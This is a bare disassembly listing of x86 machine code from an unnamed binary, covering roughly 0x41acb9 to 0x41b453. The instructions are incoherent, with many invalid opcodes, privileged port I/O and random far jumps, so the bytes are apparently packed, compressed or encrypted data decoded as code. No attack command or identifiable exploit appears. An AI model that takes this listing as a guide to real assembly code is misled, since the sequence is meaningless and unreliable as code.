  41acb9:	stos   DWORD PTR es:[edi],eax
  41acba:	dec    edx
  41acbb:	sbb    DWORD PTR [edx-0x37],eax
  41acbe:	ins    DWORD PTR es:[edi],dx
  41acbf:	(bad)  
  41acc0:	loope  0x41acb6
  41acc2:	mov    edx,0x8e7e71d1
  41acc7:	sahf   
  41acc8:	xor    al,0xbf
  41acca:	and    ch,BYTE PTR [ecx+0x6f]
  41accd:	cmp    cl,BYTE PTR [esi]
  41accf:	push   cs
  41acd0:	clc    
  41acd1:	jmp    0x65d9b42b
  41acd6:	iret   
  41acd7:	cmp    eax,0xb4f8f678
  41acdc:	or     ecx,edx
  41acde:	mov    ah,0x7a
  41ace0:	mov    ebx,0x92e758bd
  41ace5:	int3   
  41ace6:	pop    edi
  41ace7:	add    BYTE PTR [esi-0x377f83d3],bh
  41aced:	mov    ebx,0x4a7f35fc
  41acf2:	js     0x41ac96
  41acf4:	inc    esi
  41acf5:	xchg   esp,eax
  41acf6:	sti    
  41acf7:	stos   BYTE PTR es:[edi],al
  41acf8:	loope  0x41ad1a
  41acfa:	or     cl,BYTE PTR [esp+eiz*2-0x7c]
  41acfe:	scas   eax,DWORD PTR es:[edi]
  41acff:	push   ecx
  41ad00:	test   BYTE PTR ds:0x4ff06cf2,bl
  41ad06:	(bad)  
  41ad07:	addr16 xchg esp,eax
  41ad09:	dec    edi
  41ad0a:	add    DWORD PTR [ebp+0x24],0x4681377e
  41ad11:	sbb    DWORD PTR [edx+0x3c],0x7028ed27
  41ad18:	int    0xb0
  41ad1a:	inc    esp
  41ad1b:	push   0xffffffbf
  41ad1d:	in     eax,dx
  41ad1e:	push   ecx
  41ad1f:	jge    0x41acb9
  41ad21:	(bad)  
  41ad22:	adc    bp,di
  41ad25:	ret    0x86cc
  41ad28:	push   esp
  41ad29:	pop    esp
  41ad2a:	lds    esp,FWORD PTR [ecx]
  41ad2c:	pop    es
  41ad2d:	cld    
  41ad2e:	je     0x41acba
  41ad30:	jno    0x41ad52
  41ad32:	hlt    
  41ad33:	xchg   ebx,ebp
  41ad35:	int3   
  41ad36:	jmp    0x44a7:0x2a4240ff
  41ad3d:	push   ds
  41ad3e:	rol    DWORD PTR ds:0x8aa0c2b2,1
  41ad44:	outs   dx,BYTE PTR ds:[esi]
  41ad45:	stc    
  41ad46:	les    ebx,FWORD PTR [ebp-0x7695c00]
  41ad4c:	or     al,0x1b
  41ad4e:	pusha  
  41ad4f:	mov    ah,0xb7
  41ad51:	inc    ebp
  41ad52:	lods   al,BYTE PTR ds:[esi]
  41ad53:	inc    edi
  41ad54:	setg   dh
  41ad57:	out    dx,al
  41ad58:	push   ss
  41ad59:	cmp    al,0x44
  41ad5b:	aaa    
  41ad5c:	push   esp
  41ad5d:	cmp    eax,0xe4f7fad6
  41ad62:	mov    edx,DWORD PTR [ebx-0x57]
  41ad65:	mov    edx,0x5b27eb61
  41ad6a:	stos   BYTE PTR es:[edi],al
  41ad6b:	xchg   ecx,eax
  41ad6c:	xor    al,0xa
  41ad6e:	out    0x19,al
  41ad70:	aad    0xd2
  41ad72:	out    dx,eax
  41ad73:	sub    al,0x31
  41ad75:	push   ebp
  41ad76:	mov    bh,0x56
  41ad78:	xchg   edi,eax
  41ad79:	addr16 out dx,al
  41ad7b:	rcr    bl,1
  41ad7d:	es cli 
  41ad7f:	adc    ebp,0xffffffa9
  41ad82:	sahf   
  41ad83:	jecxz  0x41ad3e
  41ad85:	inc    ebx
  41ad86:	mov    ebx,0x34e6e310
  41ad8b:	jns    0x41adb1
  41ad8d:	lea    ebp,[ecx-0x76ad8406]
  41ad93:	push   cs
  41ad94:	enter  0x9443,0x8a
  41ad98:	pop    es
  41ad99:	mov    ebp,0xd19fa693
  41ad9e:	sub    edx,eax
  41ada0:	mov    edi,0x6ce521
	...
  41adb1:	pop    es
  41adb2:	sbb    BYTE PTR [esi+0x3fbf9fa7],0xa2
  41adb9:	dec    eax
  41adba:	imul   ebx,DWORD PTR [eax+edx*4-0x2c23e735],0x11
  41adc2:	sub    eax,DWORD PTR [ecx]
  41adc4:	add    BYTE PTR [ebx+0x16000003],ch
  41adca:	mov    BYTE PTR [edi+0x17abc2b5],bl
  41add0:	repz push esp
  41add2:	fld    DWORD PTR ds:0x5c8d99ac
  41add8:	js     0x41ada8
  41adda:	inc    ebp
  41addb:	in     eax,dx
  41addc:	sbb    ch,cl
  41adde:	mov    dl,0xcc
  41ade0:	pop    ebp
  41ade1:	cli    
  41ade2:	xor    DWORD PTR [ecx-0x20],edx
  41ade5:	xchg   edi,eax
  41ade6:	and    al,0xf3
  41ade8:	pop    ss
  41ade9:	aad    0xf1
  41adeb:	retf   
  41adec:	mov    eax,0x2ff26b40
  41adf1:	jl     0x41ae4d
  41adf3:	and    esp,DWORD PTR [ecx-0x62]
  41adf6:	gs lahf 
  41adf8:	mov    eax,0x6765169a
  41adfd:	mov    edi,0x2d84ec54
  41ae02:	adc    al,0x88
  41ae04:	mov    al,ds:0xe928c270
  41ae09:	leave  
  41ae0a:	or     ah,dl
  41ae0c:	xchg   esi,eax
  41ae0d:	test   DWORD PTR [eax-0x7c],0x3f6738d8
  41ae14:	imul   esp,DWORD PTR ds:0x346319fa,0xd319f219
  41ae1e:	je     0x41ae77
  41ae20:	lods   eax,DWORD PTR ds:[esi]
  41ae21:	xchg   ebx,eax
  41ae22:	and    edi,DWORD PTR [ebp+0x7c4ac12]
  41ae28:	xor    edx,DWORD PTR [esi]
  41ae2a:	or     eax,0x3b0f7097
  41ae2f:	or     bl,BYTE PTR [esp+ebp*1-0x66]
  41ae33:	lock sbb dl,BYTE PTR [edx-0x14]
  41ae37:	mov    ebp,0x5c42aa1
  41ae3c:	fucomp st(6)
  41ae3e:	aad    0x3e
  41ae40:	stos   BYTE PTR es:[edi],al
  41ae41:	mov    ch,0xde
  41ae43:	inc    BYTE PTR [ecx+0x79c540b6]
  41ae49:	push   ds
  41ae4a:	mov    esi,0xcb1bdf1
  41ae4f:	jg     0x41aea7
  41ae51:	and    BYTE PTR [eax],0x20
  41ae54:	pop    ebx
  41ae55:	outs   dx,BYTE PTR cs:[esi]
  41ae57:	mov    ebx,0xdb44be30
  41ae5c:	pushf  
  41ae5d:	mov    ebp,0xa106c2e8
  41ae62:	loop   0x41aed8
  41ae64:	add    eax,0x350b0cd6
  41ae69:	idiv   edx
  41ae6b:	xor    ch,BYTE PTR [edx]
  41ae6d:	or     dh,BYTE PTR [ecx+0xa]
  41ae70:	mov    al,ds:0x60ba4b7d
  41ae75:	(bad)  
  41ae76:	and    al,BYTE PTR [edi]
  41ae78:	(bad)  
  41ae79:	fnstenv [edi-0x71]
  41ae7c:	lods   eax,DWORD PTR ds:[esi]
  41ae7d:	test   BYTE PTR [eax],al
  41ae7f:	mov    eax,0xbb3b7a61
  41ae84:	jb     0x41aec9
  41ae86:	sub    dh,bl
  41ae88:	or     dh,bh
  41ae8a:	(bad)  
  41ae8b:	frstor [ecx-0x7f5b06b]
  41ae91:	adc    eax,DWORD PTR [ebx]
  41ae93:	jnp    0x41ae8e
  41ae95:	dec    eax
  41ae96:	retf   0xa0b8
  41ae99:	mov    edi,0x5e631736
  41ae9e:	or     dh,BYTE PTR [ebp+edi*2-0x7a1ad7e1]
  41aea5:	das    
  41aea6:	inc    ecx
  41aea7:	or     eax,0xeed5ee08
  41aeac:	ja     0x41af17
  41aeae:	and    esp,DWORD PTR [edx+0x50c227d9]
  41aeb4:	sbb    ah,dh
  41aeb6:	add    DWORD PTR [ebx],edi
  41aeb8:	sub    eax,0x304e7c3a
  41aebd:	and    eax,0x39b0fc1a
  41aec2:	pop    ebp
  41aec3:	in     al,dx
  41aec4:	(bad)  
  41aec6:	repz out dx,al
  41aec8:	sahf   
  41aec9:	jb     0x41af21
  41aecb:	xor    esi,edi
  41aecd:	xor    DWORD PTR [edi],0xea886005
  41aed3:	test   eax,0xe624a2f2
  41aed8:	ins    DWORD PTR es:[edi],dx
  41aed9:	hlt    
  41aeda:	mov    edx,0x146ea531
  41aedf:	mov    al,ss:0xeb118ccd
  41aee5:	jp     0x41ae6d
  41aee7:	ret    
  41aee8:	xchg   BYTE PTR [ecx-0x345468b],ah
  41aeee:	add    DWORD PTR [edi+0x1e],esi
  41aef1:	popa   
  41aef2:	push   esp
  41aef3:	(bad)  
  41aef4:	mov    ebx,0xd7e72fe8
  41aef9:	fst    QWORD PTR [ecx+0xb8aa3df]
  41aeff:	inc    ebp
  41af00:	addr16 cmp ecx,ecx
  41af03:	mov    ebp,ebp
  41af05:	or     al,BYTE PTR [ebp+eax*4+0x61]
  41af09:	inc    eax
  41af0a:	lea    esp,[ecx+0x6e7f13cd]
  41af10:	pop    es
  41af11:	pop    eax
  41af12:	inc    edi
  41af13:	mov    ah,0xa4
  41af15:	mov    ds:0xf5936a6a,al
  41af1a:	scas   al,BYTE PTR es:[edi]
  41af1b:	mov    dh,0x27
  41af1d:	or     eax,DWORD PTR [esi]
  41af1f:	imul   esp,DWORD PTR [esi],0x76
  41af22:	push   esi
  41af23:	jp     0x41aecf
  41af25:	xor    BYTE PTR [edx-0x2a],al
  41af28:	xchg   edx,eax
  41af29:	addr16 push ds
  41af2b:	mov    ah,0x6d
  41af2d:	jg     0x41af43
  41af2f:	jmp    0xf77c:0x8dd12053
  41af36:	dec    ebp
  41af37:	mov    al,ds:0x7137be9a
  41af3c:	jmp    0x41af3c
  41af3e:	mov    esi,gs
  41af40:	adc    BYTE PTR [edi-0x40],ch
  41af43:	pop    es
  41af44:	sub    ebx,esi
  41af46:	ss jecxz 0x41aedc
  41af49:	rcr    dl,0x2c
  41af4c:	mov    edx,0x61e0d083
  41af51:	inc    eax
  41af52:	sub    ch,BYTE PTR [ebp+esi*2+0x6f661ec4]
  41af59:	fs jns 0x41af41
  41af5c:	outs   dx,BYTE PTR ds:[esi]
  41af5d:	inc    edx
  41af5e:	arpl   WORD PTR [ebx-0x458e9c4d],bx
  41af64:	xchg   dh,bh
  41af66:	adc    eax,0x178fb205
  41af6b:	sub    ecx,DWORD PTR [ecx]
  41af6d:	ss cmp ah,ch
  41af70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af71:	daa    
  41af72:	xor    al,0xc4
  41af74:	retf   
  41af75:	in     eax,dx
  41af76:	add    bh,dh
  41af78:	std    
  41af79:	mul    BYTE PTR [eax+0x54]
  41af7c:	ins    DWORD PTR es:[edi],dx
  41af7d:	dec    ebx
  41af7e:	mov    dh,BYTE PTR [edi]
  41af80:	add    BYTE PTR [edx],0x4c
  41af83:	push   ecx
  41af84:	arpl   WORD PTR [edx-0x3430b9c8],cx
  41af8a:	dec    ecx
  41af8b:	add    al,ah
  41af8d:	add    ebp,edx
  41af8f:	imul   esi,ebp,0x4d
  41af92:	pop    eax
  41af93:	mov    es,WORD PTR [ebx]
  41af95:	jmp    0x1e19fe10
  41af9a:	and    edx,ebx
  41af9c:	dec    edx
  41af9d:	sbb    eax,0x9be54d69
  41afa2:	push   cs
  41afa3:	hlt    
  41afa4:	xor    bh,BYTE PTR [esi]
  41afa6:	aam    0x52
  41afa8:	pusha  
  41afa9:	stos   DWORD PTR es:[edi],eax
  41afaa:	and    cl,ah
  41afac:	sbb    eax,DWORD PTR [edi-0x5e3e76f2]
  41afb2:	jmp    0x7863c2a6
  41afb7:	jecxz  0x41afeb
  41afb9:	out    dx,al
  41afba:	out    0x8,al
  41afbc:	int    0xb7
  41afbe:	xchg   esi,eax
  41afbf:	mov    ebx,0xcceabbb5
  41afc4:	ins    BYTE PTR es:[edi],dx
  41afc5:	mov    ebx,0x5e6ad289
  41afca:	jl     0x41afe3
  41afcc:	es leave 
  41afce:	pop    ds
  41afcf:	les    ebp,FWORD PTR [ebx+0x6e]
  41afd2:	sub    eax,0x1578ae4b
  41afd7:	jmp    0xffe1:0x4ee77ece
  41afde:	out    dx,al
  41afdf:	adc    DWORD PTR [ebx+0x56a2d297],ebp
  41afe5:	pop    edi
  41afe6:	pop    esi
  41afe7:	xchg   esi,eax
  41afe8:	dec    edi
  41afe9:	pop    ecx
  41afea:	enter  0x164e,0x3a
  41afee:	mov    eax,0x78f7213e
  41aff3:	inc    edi
  41aff4:	and    bh,BYTE PTR [edx]
  41aff6:	ins    DWORD PTR es:[edi],dx
  41aff7:	mov    bh,0xff
  41aff9:	mov    eax,0xaf4d27b9
  41affe:	lahf   
  41afff:	jmp    0x41b035
  41b001:	mov    BYTE PTR [edx],ah
  41b003:	jae    0x41b082
  41b005:	retf   0x1f38
  41b008:	push   ss
  41b009:	into   
  41b00a:	add    ch,bl
  41b00c:	add    DWORD PTR ds:0x9940de9,ebx
  41b012:	mov    dl,0xc4
  41b014:	jbe    0x41b055
  41b016:	out    0xe2,al
  41b018:	xchg   ebp,eax
  41b019:	pop    edx
  41b01a:	add    esi,ebp
  41b01c:	repnz jecxz 0x41b00c
  41b01f:	repnz push ss
  41b021:	push   esi
  41b022:	inc    esp
  41b023:	push   eax
  41b024:	or     ebp,ecx
  41b026:	outs   dx,BYTE PTR ds:[esi]
  41b027:	adc    al,0xae
  41b029:	mov    ?,WORD PTR [ecx]
  41b02b:	mov    edx,0xafdb8bdf
  41b030:	or     cl,dh
  41b032:	mov    eax,0xf9f07fcf
  41b037:	imul   ecx
  41b039:	hlt    
  41b03a:	push   ebx
  41b03b:	popa   
  41b03c:	xor    eax,0x4fa753a9
  41b041:	xrelease mov DWORD PTR [eax],esi
  41b044:	outs   dx,BYTE PTR ds:[esi]
  41b045:	ja     0x41b096
  41b047:	and    al,0x24
  41b049:	shr    BYTE PTR [ebx],1
  41b04b:	sbb    ebp,edi
  41b04d:	push   ds
  41b04e:	(bad)  
  41b04f:	cmc    
  41b050:	imul   esi,DWORD PTR [ebp+0x2d697a88],0x5c6c9b60
  41b05a:	sub    bh,BYTE PTR [ebx+ebx*1+0x73cc774d]
  41b061:	push   eax
  41b062:	mov    cl,0x6e
  41b064:	mov    esi,0x9792ff3e
  41b069:	xchg   edi,eax
  41b06a:	hlt    
  41b06b:	add    al,0x7c
  41b06d:	adc    ecx,esi
  41b06f:	jle    0x41b09e
  41b071:	mov    ecx,0xd3f1834e
  41b076:	fxch   st(3)
  41b078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b079:	cmp    DWORD PTR [eax+edi*4],edx
  41b07c:	add    DWORD PTR ds:0x6a360527,esi
  41b082:	fs repnz push ss
  41b085:	push   esp
  41b086:	ins    DWORD PTR es:[edi],dx
  41b087:	pusha  
  41b088:	push   eax
  41b089:	xchg   DWORD PTR [edx+edi*8+0x37],esp
  41b08d:	int    0x56
  41b08f:	retf   0x77f5
  41b092:	push   0x281988cb
  41b097:	loopne 0x41b0c2
  41b099:	push   edx
  41b09a:	div    BYTE PTR [esi]
  41b09c:	pop    ebp
  41b09d:	and    ecx,esp
  41b09f:	xor    ch,0x17
  41b0a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0a3:	mov    ds:0x9a87195e,eax
  41b0a8:	adc    eax,0x72ec2969
  41b0ad:	xchg   ebp,eax
  41b0af:	icebp  
  41b0b0:	jp     0x41b10d
  41b0b2:	sbb    edx,DWORD PTR [ebx]
  41b0b4:	push   esp
  41b0b5:	shr    BYTE PTR [eax+0x7f],0x42
  41b0b9:	mov    bh,0x5e
  41b0bb:	pop    edx
  41b0bc:	pop    ss
  41b0bd:	add    BYTE PTR ds:0xa3c71578,cl
  41b0c3:	sbb    DWORD PTR [ebx-0xe],ecx
  41b0c6:	aam    0x39
  41b0c8:	es xor al,0x7a
  41b0cb:	cmp    al,0xb6
  41b0cd:	inc    eax
  41b0ce:	js     0x41b09f
  41b0d0:	and    ebp,DWORD PTR [bx+si-0x6d8]
  41b0d5:	enter  0x41d,0xda
  41b0d9:	jmp    0x6875:0x17fd0abd
  41b0e0:	test   BYTE PTR ds:0xd1c5d214,ah
  41b0e6:	imul   eax,DWORD PTR [edi+0x754c02b8],0x76f2c3f6
  41b0f0:	shr    BYTE PTR [ebx+0x3b],1
  41b0f3:	jnp    0x41b10f
  41b0f5:	jno    0x41b0a3
  41b0f7:	(bad)  
  41b0f8:	cmp    eax,0xe8c590a8
  41b0fd:	push   esi
  41b0fe:	in     al,0x9e
  41b100:	fndisi(8087 only) 
  41b102:	stos   BYTE PTR es:[edi],al
  41b103:	xor    eax,0x73bbe23e
  41b108:	xor    DWORD PTR ds:0x37e9ce0a,ecx
  41b10e:	jbe    0x41b169
  41b110:	push   ebx
  41b111:	jmp    FWORD PTR ds:0xe736d321
  41b117:	jg     0x41b164
  41b119:	ret    
  41b11a:	mov    bh,0xfc
  41b11c:	call   0xbde:0x4d64e393
  41b123:	cdq    
  41b124:	pop    esp
  41b125:	mov    ecx,0xcf90bccc
  41b12a:	fstp   QWORD PTR [edi]
  41b12c:	shr    esi,cl
  41b12e:	pop    ebp
  41b12f:	daa    
  41b130:	adc    BYTE PTR [edx-0x18],al
  41b133:	cmp    eax,0xf4aa9d69
  41b138:	inc    edx
  41b139:	lods   al,BYTE PTR ds:[esi]
  41b13a:	in     al,dx
  41b13b:	push   esp
  41b13c:	and    eax,DWORD PTR [esi-0x26668e59]
  41b142:	pop    edi
  41b143:	pop    DWORD PTR [esi-0x4e930a30]
  41b149:	popf   
  41b14a:	inc    esp
  41b14b:	xchg   BYTE PTR [ecx],cl
  41b14d:	(bad)  
  41b14f:	xor    BYTE PTR [ebp+0x79],dl
  41b152:	mov    ah,0xf1
  41b154:	ins    BYTE PTR es:[edi],dx
  41b155:	test   DWORD PTR [edx-0x7d036f7a],esp
  41b15b:	inc    ebx
  41b15c:	js     0x41b1d2
  41b15e:	mov    eax,0x22a26ae7
  41b163:	sbb    BYTE PTR [edx],ch
  41b165:	push   edx
  41b166:	sub    al,0xcb
  41b168:	cmp    esi,DWORD PTR [edx]
  41b16a:	mov    dh,0xf4
  41b16c:	sbb    DWORD PTR [eax+0x29],esp
  41b16f:	xor    al,0x1d
  41b171:	pop    ebp
  41b172:	adc    eax,0xbc
	...
  41b17f:	add    BYTE PTR [eax],al
  41b181:	jecxz  0x41b16b
  41b183:	nop
  41b184:	rcr    BYTE PTR [ebx+0x79fbe3f8],1
  41b18a:	dec    edx
  41b18b:	shr    ebp,0x8
  41b18e:	cld    
  41b18f:	jg     0x41b157
  41b191:	mov    esp,0xab00012e
  41b196:	add    eax,DWORD PTR [eax]
  41b198:	add    bh,bh
  41b19a:	mov    edi,ds
  41b19c:	push   es
  41b19d:	push   0xb280a31f
  41b1a2:	imul   DWORD PTR [esp+ebp*8-0x24]
  41b1a6:	loope  0x41b1f0
  41b1a8:	fcom   DWORD PTR [esp+esi*8+0x76]
  41b1ac:	dec    esi
  41b1ad:	ffreep st(1)
  41b1af:	popa   
  41b1b0:	mov    ch,0xe4
  41b1b2:	rol    DWORD PTR [ebp-0x2947f5],0xfa
  41b1b9:	add    al,0xf7
  41b1bb:	adc    al,0x3d
  41b1bd:	mov    ebp,0xa71cbb9d
  41b1c2:	(bad)  
  41b1c3:	aam    0x7d
  41b1c5:	jns    0x41b198
  41b1c7:	xchg   edi,eax
  41b1c8:	lods   al,BYTE PTR ds:[esi]
  41b1c9:	es pusha 
  41b1cb:	pop    ds
  41b1cc:	int3   
  41b1cd:	dec    ax
  41b1cf:	and    eax,0xf6bd43bb
  41b1d4:	push   ebx
  41b1d5:	daa    
  41b1d6:	(bad)  
  41b1d7:	(bad)  
  41b1d8:	int    0xa4
  41b1da:	sub    eax,esp
  41b1dc:	sbb    bh,ah
  41b1de:	aaa    
  41b1df:	pop    esi
  41b1e0:	mov    bl,0xb0
  41b1e2:	mov    WORD PTR [edx],fs
  41b1e4:	sbb    BYTE PTR [ecx+0x74f4d753],0x61
  41b1eb:	xor    dh,ah
  41b1ed:	sub    bl,BYTE PTR [ebx]
  41b1ef:	jnp    0x41b25c
  41b1f1:	scas   al,BYTE PTR es:[edi]
  41b1f2:	push   ecx
  41b1f3:	pop    ebp
  41b1f4:	bound  ecx,QWORD PTR [eax+edi*2]
  41b1f7:	cs jg  0x41b1f2
  41b1fa:	adc    esp,ecx
  41b1fc:	pop    ebp
  41b1fd:	mov    ch,0x53
  41b1ff:	jb     0x41b24a
  41b201:	inc    edx
  41b202:	sub    BYTE PTR [esi],al
  41b204:	fidiv  DWORD PTR [ebp+0x73]
  41b207:	xchg   edi,eax
  41b208:	adc    eax,0x9c8ec7ed
  41b20d:	jnp    0x41b1fb
  41b20f:	pop    eax
  41b210:	lea    edx,[esi]
  41b212:	(bad)  
  41b213:	pop    ecx
  41b214:	std    
  41b215:	outs   dx,DWORD PTR ds:[esi]
  41b216:	or     al,0x7d
  41b218:	repnz and al,0x6e
  41b21b:	dec    esp
  41b21c:	push   esi
  41b21d:	mov    BYTE PTR [ebp+0x2b],ah
  41b220:	inc    eax
  41b221:	xor    eax,0xe22b08b8
  41b226:	shr    DWORD PTR [ebx+ebp*2+0x27e2ce58],0x2
  41b22e:	out    0x92,eax
  41b230:	fwait
  41b231:	arpl   WORD PTR [edx-0x55],si
  41b234:	fist   WORD PTR [ebp+0x63]
  41b237:	or     BYTE PTR [edx+0x63],al
  41b23a:	fwait
  41b23b:	or     BYTE PTR [ecx],ch
  41b23d:	sbb    eax,0xf8acaecf
  41b242:	xlat   BYTE PTR ds:[ebx]
  41b243:	adc    eax,0x16542f2e
  41b248:	mov    DWORD PTR [ebp+0x7],0xcd8e3569
  41b24f:	cdq    
  41b250:	xchg   edi,eax
  41b251:	jmp    0xd46e:0x3b4b8cbe
  41b258:	jb     0x41b254
  41b25a:	push   ecx
  41b25b:	clc    
  41b25c:	nop
  41b25d:	outs   dx,BYTE PTR ds:[esi]
  41b25e:	bswap  ebx
  41b260:	out    dx,al
  41b261:	mov    edx,0x2c7bc1b4
  41b266:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b267:	fistp  DWORD PTR [esi]
  41b269:	push   0x8c4f2ea6
  41b26e:	jg     0x41b24b
  41b270:	sub    edx,ebp
  41b272:	and    DWORD PTR [edi-0x53321],ecx
  41b278:	jne    0x41b1fd
  41b27a:	mov    cl,0x48
  41b27c:	pusha  
  41b27d:	dec    esi
  41b27e:	pop    ds
  41b27f:	scas   al,BYTE PTR es:[edi]
  41b280:	in     al,0xf8
  41b282:	xor    DWORD PTR [eax+0x6dbd2244],ebx
  41b288:	xchg   ebx,eax
  41b289:	pop    ss
  41b28a:	fdiv   QWORD PTR [eax]
  41b28c:	mov    dl,0x5b
  41b28e:	mov    ecx,0x73abde37
  41b293:	icebp  
  41b294:	mov    bh,0x21
  41b296:	cs push ebx
  41b298:	in     al,dx
  41b299:	push   esp
  41b29a:	shl    BYTE PTR [ecx-0x4e],0x3d
  41b29e:	xor    DWORD PTR [eax],ebx
  41b2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2a1:	add    al,0xa
  41b2a3:	add    eax,0x83781060
  41b2a8:	adc    dl,BYTE PTR [ecx-0x28]
  41b2ab:	jp     0x41b2a6
  41b2ad:	mov    eax,ds:0x92599422
  41b2b2:	sbb    ebx,DWORD PTR [edi-0x6f]
  41b2b5:	gs popf 
  41b2b7:	jae    0x41b2b9
  41b2b9:	sbb    DWORD PTR [ebx-0x12],0x2a
  41b2bd:	and    DWORD PTR [ebx],0xc3478aac
  41b2c3:	or     BYTE PTR gs:[ebx+0x4b043b01],ah
  41b2ca:	mov    BYTE PTR [ecx+0x75420ab],al
  41b2d0:	les    esp,FWORD PTR [eax]
  41b2d2:	into   
  41b2d3:	sub    esi,DWORD PTR [eax]
  41b2d5:	xor    al,0x68
  41b2d7:	hlt    
  41b2d8:	mov    ebx,0xa81a6205
  41b2dd:	cvtps2pi mm2,QWORD PTR [eax-0x2e02f749]
  41b2e4:	scas   eax,DWORD PTR es:[edi]
  41b2e5:	mov    eax,0x1d031c53
  41b2ea:	test   bh,dh
  41b2ec:	mov    esp,DWORD PTR ds:0xe22bbc01
  41b2f2:	jb     0x41b2f7
  41b2f4:	addr16 sub eax,0xa7512073
  41b2fa:	stos   DWORD PTR es:[edi],eax
  41b2fb:	inc    ebp
  41b2fc:	cmp    DWORD PTR [esi-0x3],edx
  41b2ff:	mov    ecx,edx
  41b301:	push   ebp
  41b302:	es push eax
  41b304:	int3   
  41b305:	in     al,dx
  41b306:	jno    0x41b2bc
  41b308:	sbb    DWORD PTR [edx],edi
  41b30a:	fistp  WORD PTR [ecx]
  41b30c:	pop    ds
  41b30d:	or     esp,DWORD PTR [edi]
  41b30f:	cmp    dl,BYTE PTR [edx]
  41b311:	jb     0x41b2c9
  41b313:	inc    esi
  41b314:	fs pop ebx
  41b316:	out    dx,al
  41b317:	imul   ebp,DWORD PTR [edx+0x425b4005],0x688e93bf
  41b321:	arpl   WORD PTR cs:[ebp-0x71],bx
  41b325:	clc    
  41b326:	jmp    0x6b1:0xa45c76be
  41b32d:	cmp    BYTE PTR [eax],al
  41b32f:	sti    
  41b330:	add    BYTE PTR [esi+eiz*1+0x2e],al
  41b334:	push   es
  41b335:	sbb    ah,BYTE PTR [eax-0x35f18cfe]
  41b33b:	pop    eax
  41b33c:	push   edx
  41b33d:	retf   
  41b33e:	in     eax,0x11
  41b340:	pop    edi
  41b341:	pop    edx
  41b342:	jne    0x41b348
  41b344:	scas   eax,DWORD PTR es:[edi]
  41b345:	fcmovbe st,st(1)
  41b347:	sub    DWORD PTR [esi],edi
  41b349:	and    eax,0xd51f3416
  41b34e:	mov    ecx,0x78a1283d
  41b353:	arpl   WORD PTR [ebp-0x419f9261],ax
  41b359:	dec    eax
  41b35a:	mov    cs,WORD PTR [ebp+0x0]
  41b35d:	pop    esp
  41b35e:	ficomp DWORD PTR [ecx+edi*4+0x2b]
  41b362:	push   ecx
  41b363:	cwde   
  41b364:	or     ah,BYTE PTR [ebp+0x5]
  41b367:	rcl    esi,1
  41b369:	lods   eax,DWORD PTR ds:[esi]
  41b36a:	test   edx,0x79b30196
  41b370:	mov    ds:0x1a2d16ca,eax
  41b375:	(bad)  
  41b376:	push   0x3
  41b378:	(bad)  
  41b379:	push   cs
  41b37a:	dec    esi
  41b37b:	inc    edi
  41b37c:	ins    BYTE PTR es:[edi],dx
  41b37d:	xlat   BYTE PTR ds:[ebx]
  41b37e:	mov    esp,0xe98017c6
  41b383:	data16 sub BYTE PTR [ebx-0x2b76c470],0xbe
  41b38b:	mov    eax,ds:0xd69f02b5
  41b390:	add    BYTE PTR [edx],dl
  41b392:	jmp    0x41b316
  41b394:	xchg   DWORD PTR [esi],eax
  41b396:	das    
  41b397:	jecxz  0x41b3db
  41b399:	out    dx,eax
  41b39a:	jae    0x41b40c
  41b39c:	push   ebp
  41b39d:	repnz (bad) 
  41b39f:	jmp    0x41b3ed
  41b3a1:	inc    esp
  41b3a2:	aam    0xa5
  41b3a4:	dec    ebp
  41b3a5:	mov    ebx,0x3a904d75
  41b3aa:	pop    ecx
  41b3ab:	(bad)  [edi+esi*2]
  41b3ae:	push   ebx
  41b3af:	push   ebp
  41b3b0:	fs dec ebx
  41b3b2:	pop    ss
  41b3b3:	xchg   edx,eax
  41b3b4:	les    eax,FWORD PTR ds:0x37fd45c6
  41b3ba:	leave  
  41b3bb:	pop    es
  41b3bc:	cmp    al,0x1
  41b3be:	clc    
  41b3bf:	cmp    eax,0xe4371eff
  41b3c4:	pop    edx
  41b3c5:	fild   DWORD PTR [esi-0x44432c7]
  41b3cb:	push   es
  41b3cc:	add    esp,DWORD PTR [edx+0x8]
  41b3cf:	or     DWORD PTR [ecx],ecx
  41b3d1:	pop    ecx
  41b3d2:	xor    eax,0x3470c942
  41b3d7:	js     0x41b434
  41b3d9:	and    eax,0xbec913ad
  41b3de:	xlat   BYTE PTR ds:[ebx]
  41b3df:	pushf  
  41b3e0:	xchg   ecx,eax
  41b3e1:	loope  0x41b3c5
  41b3e3:	or     eax,0x415d2ee2
  41b3e8:	lea    esp,[eax-0x11937a43]
  41b3ee:	dec    edx
  41b3ef:	in     al,0xa8
  41b3f1:	ins    DWORD PTR es:[edi],dx
  41b3f2:	fild   WORD PTR [ebx-0x77306d43]
  41b3f8:	dec    ebp
  41b3f9:	stos   DWORD PTR es:[edi],eax
  41b3fa:	jge    0x41b40c
  41b3fc:	xchg   ebp,eax
  41b3fd:	in     eax,dx
  41b3fe:	dec    esi
  41b3ff:	mov    edi,0xdf572a13
  41b404:	add    eax,0x9ed08a6e
  41b409:	xchg   edi,eax
  41b40a:	int3   
  41b40b:	lahf   
  41b40c:	cdq    
  41b40d:	cdq    
  41b40e:	inc    edx
  41b40f:	xchg   esp,eax
  41b410:	and    BYTE PTR [ebx+0x3a998b58],0x47
  41b417:	inc    ecx
  41b418:	or     al,0x44
  41b41a:	dec    ecx
  41b41b:	(bad)  
  41b41c:	cmp    BYTE PTR [esi],ch
  41b41e:	popf   
  41b41f:	xchg   DWORD PTR [esi],esp
  41b421:	(bad)  
  41b422:	enter  0x1785,0xcd
  41b426:	sti    
  41b427:	xor    eax,0xd813ffcd
  41b42c:	gs stos DWORD PTR es:[edi],eax
  41b42e:	push   eax
  41b42f:	jno    0x41b3b7
  41b431:	jge    0x41b40b
  41b433:	jle    0x41b47d
  41b435:	xor    dh,BYTE PTR [edi+0x77]
  41b438:	mov    ds:0xb7ac049,eax
  41b43d:	cmp    DWORD PTR [eax],0x702c2a8f
  41b443:	scas   al,BYTE PTR es:[edi]
  41b444:	stc    
  41b445:	pop    ds
  41b446:	push   edi
  41b447:	call   0xf0065ea0
  41b44c:	out    0x23,al
  41b44e:	or     DWORD PTR [eax],esp
  41b450:	mov    dh,BYTE PTR [edi+edx*1]
  41b453:	imul   ebx,DWORD PTR ds:0x78eb840b,0xed00178a
